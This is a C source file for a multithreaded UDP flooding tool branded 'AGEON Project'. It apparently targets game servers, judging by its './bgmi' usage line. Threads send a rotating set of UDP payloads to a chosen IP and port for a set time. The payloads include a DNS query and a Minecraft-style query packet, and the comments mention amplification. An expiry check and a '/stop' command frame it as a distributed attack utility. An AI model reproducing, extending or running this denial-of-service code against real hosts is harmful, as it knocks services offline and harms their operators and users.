#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define EXPIRATION_YEAR 2024
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 15

int stop_attack = 0;  // Global flag to stop the attack

void usage() {
    printf("AGEON Project: Usage: ./bgmi ip port time threads\n");
    exit(1);
}

int check_expiration() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRATION_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 > EXPIRATION_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR && current_time->tm_mon + 1 == EXPIRATION_MONTH && current_time->tm_mday > EXPIRATION_DAY)) {
        return 1;  // Expired
    }
    return 0;  // Not expired
}

void show_expiration() {
    printf("AGEON Project: This program will expire on %d-%02d-%02d.\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // UDP packet payloads
    char *payloads[] = {
        // Simple UDP packet (hexadecimal)
        "\x41\x41\x41\x41",     // 'AAAA'
        "\x42\x42\x42\x42",     // 'BBBB'

        // DNS-like query payload (commonly used in UDP-based DNS amplification attacks)
        "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",  // DNS query for google.com

        // Gaming-like payload (simulation of game server packets, e.g., Minecraft or similar)
        "\xfe\xfd\x09\x01\x02\x03\x04", // Simple Minecraft query packet

        // Large generic UDP data (filling with random bytes, simulating a large packet)
        "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55"
        "\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55\x55",

        // Custom UDP payload for testing
        "\x12\x34\x56\x78\x9a\xbc\xde\xf0\x11\x22\x33\x44\x55\x66\x77\x88"
        "\x99\xaa\xbb\xcc\xdd\xee\xff\x00",

        // Another DNS-like query payload
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("AGEON Project: Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime && !stop_attack) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("AGEON Project: Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

void *live_countdown(void *arg) {
    int remaining_time = *(int *)arg;

    while (remaining_time > 0 && !stop_attack) {
        printf("AGEON Project: Time left: %d seconds\r", remaining_time);
        fflush(stdout);
        sleep(1);  // Sleep for 1 second
        remaining_time--;
    }

    printf("\nAGEON Project: Attack completed!\n");
    pthread_exit(NULL);
}

void *listen_for_stop(void *arg) {
    char command[10];
    while (1) {
        scanf("%s", command);
        if (strcmp(command, "/stop") == 0) {
            stop_attack = 1;  // Set global flag to stop the attack
            printf("AGEON Project: Stopping attack...\n");
            break;
        }
    }
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    show_expiration();

    if (check_expiration()) {
        printf("AGEON Project: This code has expired. Please update it.\n");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    pthread_t stop_thread, countdown_thread;
    struct thread_data data = {ip, port, time};

    printf("AGEON Project: Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("AGEON Project: Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    if (pthread_create(&countdown_thread, NULL, live_countdown, (void *)&time) != 0) {
        perror("AGEON Project: Countdown thread creation failed");
        free(thread_ids);
        exit(1);
    }

    if (pthread_create(&stop_thread, NULL, listen_for_stop, NULL) != 0) {
        perror("AGEON Project: Stop command listener creation failed");
        free(thread_ids);
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    pthread_join(countdown_thread, NULL);
    pthread_join(stop_thread, NULL);

    free(thread_ids);
    printf("AGEON Project: Attack finished.\n");

    return 0;
}
